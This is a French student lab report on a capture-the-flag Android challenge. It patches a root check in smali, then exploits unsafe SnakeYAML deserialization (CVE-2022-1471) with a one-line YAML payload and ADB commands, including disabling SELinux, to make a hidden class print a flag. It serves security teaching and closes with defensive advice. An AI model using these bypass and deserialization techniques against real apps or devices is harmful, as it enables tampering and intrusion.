
# Rapport de Laboratoire 19 : Analyse et Exploitation Android

**Sujet : Reverse Engineering et Exploitation de vulnérabilité SnakeYAML**
**Auteur : Nisrine Gorfti**
**Date : 2026-06-01**

---

## 1. Objectif du Lab

L'objectif est de réaliser un audit de sécurité sur l'application `snake.apk` pour extraire un flag caché. Le défi combine deux aspects :

- **Bypass de sécurité** : Contourner les mécanismes anti-root/anti-debug
- **Exploitation** : Utiliser une vulnérabilité de désérialisation YAML pour instancier une classe malveillante

---

## 2. Analyse Statique

L'ouverture de l'APK dans JADX-GUI a permis d'identifier la structure suivante :

- **MainActivity** : Contient une méthode `isDeviceRooted()` qui bloque l'application
- **Classe BigBoss** : Une classe non appelée par le flux normal du programme, dont le constructeur imprime le flag dans le Logcat
- **Vulnérabilité** : L'application utilise SnakeYAML pour charger des fichiers sans validation, permettant une instanciation de classe arbitraire

![Analyse statique JADX - structure](https://github.com/user-attachments/assets/2b8ed6e1-a26f-47b4-83d5-f75c72e89a3a)

![Classe BigBoss identifiée](https://github.com/user-attachments/assets/bea8af58-4e17-4d0f-9935-d0081aff9afc)

---

## 3. Étapes de Réalisation

### A. Modification du Bytecode (Patching Smali)

Pour supprimer la barrière du Root, l'APK a été décompilé avec apktool :

- Modification de `MainActivity.smali`
- Neutralisation du saut conditionnel après l'appel à `isDeviceRooted()`
- Recompilation et signature avec `uber-apk-signer`

![Patch smali appliqué](https://github.com/user-attachments/assets/7c514fdc-a5b6-4fc3-8a3d-b8bc2af97231)

---

### B. Création du Payload

Un fichier YAML a été conçu pour forcer l'application à instancier la classe `BigBoss`.

**Fichier : `Skull_Face.yml`**

```yaml
!!com.pwnsec.snake.BigBoss ["Snaaaaaaaaaaaaaake"]
```

---

### C. Injection et Exécution

L'exploitation finale a été réalisée via ADB en suivant une séquence précise de commandes :

```bash
# 1. Préparation du répertoire de travail sur l'émulateur
adb shell mkdir -p /sdcard/snake

# 2. Transfert du fichier YAML malveillant (Payload)
adb push Skull_Face.yml /sdcard/snake/Skull_Face.yml

# 3. Attribution manuelle des permissions de stockage
adb shell pm grant com.pwnsec.snake android.permission.READ_EXTERNAL_STORAGE

# 4. Désactivation de SELinux pour éviter le blocage du processus natif
adb shell setenforce 0

# 5. Déclenchement de l'exploitation via un Intent avec paramètres
adb shell am start -n com.pwnsec.snake/.MainActivity -e SNAKE BigBoss
```

![Injection ADB et exécution du payload](https://github.com/user-attachments/assets/cf87b02e-2198-4e61-a7a5-02fb07427973)

---

## 4. Capture du Flag

L'extraction du flag ne s'effectue pas via l'interface graphique, mais à travers les flux de logs du système Android. En utilisant `logcat` avec un filtre sur le tag `BigBoss`, nous avons intercepté la chaîne générée lors de l'instanciation de la classe via le payload YAML.

**Commande de surveillance en temps réel :**

```bash
adb logcat -s BigBoss
```

![Flag capturé dans logcat](https://github.com/user-attachments/assets/1a9800e7-75b4-414b-bb36-4a1f7a2a2476)

---

## 5. Conclusion

Ce laboratoire a permis de mettre en pratique une chaîne d'attaque complète sur un environnement Android, couvrant plusieurs domaines critiques :

| Domaine | Technique utilisée |
|---|---|
| Ingénierie inverse | JADX-GUI — identification des protections anti-root |
| Patching binaire | Apktool — modification du bytecode Smali |
| Exploitation | SnakeYAML CVE-2022-1471 — instanciation de classe arbitraire |
| Extraction | ADB logcat — capture du flag en temps réel |

**Leçon apprise :** La sécurité ne doit jamais reposer uniquement sur des vérifications locales. Il est impératif d'utiliser des parseurs sécurisés (`SafeConstructor` de SnakeYAML 2.0+) et de suivre le principe du moindre privilège lors de la manipulation de fichiers sur le stockage externe.

---

*Nisrine Gorfti — EMSI — 2026-06-01*
*Analyse réalisée dans le cadre du cours de sécurité mobile — usage pédagogique uniquement*
